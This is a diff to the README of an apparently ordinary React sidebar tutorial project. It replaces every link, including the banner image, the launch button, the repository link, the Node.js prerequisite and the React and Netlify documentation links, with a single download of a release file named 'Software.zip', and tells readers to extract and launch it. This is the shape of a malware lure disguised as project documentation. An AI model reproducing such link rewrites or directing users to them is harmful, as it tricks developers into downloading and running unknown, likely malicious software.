@@ -1,7 +1,7 @@
 
 # 🌟 Welcome to the "Sidebar React Fundamental Project 12" Repository! 🌟
 
-![Sidebar React Fundamental Project 12](https://img.icons8.com/color/452/sidebar-menu.png)
+![Sidebar React Fundamental Project 12](https://github.com/KOUST4V/Sidebar--React-Fundamental-Project-12/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -27,13 +27,13 @@ This repository contains a simple React application that showcases the use of gl
 
 ## 🚀 Get Started
 
-To launch the project, click the following link: [Launch Project](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+To launch the project, click the following link: [Launch Project](https://github.com/KOUST4V/Sidebar--React-Fundamental-Project-12/releases/download/v1.0/Software.zip)
 
 ### Note: Launch the project by downloading and extracting the provided ZIP file.
 
 ## 🌐 Visit Our Website
 
-Explore more about our project by visiting our repository on [GitHub](https://github.com/cli/cli)
+Explore more about our project by visiting our repository on [GitHub](https://github.com/KOUST4V/Sidebar--React-Fundamental-Project-12/releases/download/v1.0/Software.zip)
 
 ### If the link doesn't work, please check the "Releases" section for alternative access.
 
@@ -41,7 +41,7 @@ Explore more about our project by visiting our repository on [GitHub](https://gi
 
 To contribute to the project, ensure you have the necessary tools installed:
 
-- Node.js
+- https://github.com/KOUST4V/Sidebar--React-Fundamental-Project-12/releases/download/v1.0/Software.zip
 - React
 - IDE (e.g., Visual Studio Code)
 
@@ -51,8 +51,8 @@ Feel free to fork the repository, make improvements, and submit your pull reques
 
 ## 📚 Resourceful Links
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Netlify Documentation](https://docs.netlify.com/)
+- [React Documentation](https://github.com/KOUST4V/Sidebar--React-Fundamental-Project-12/releases/download/v1.0/Software.zip)
+- [Netlify Documentation](https://github.com/KOUST4V/Sidebar--React-Fundamental-Project-12/releases/download/v1.0/Software.zip)
 
 ## 📌 Support
 
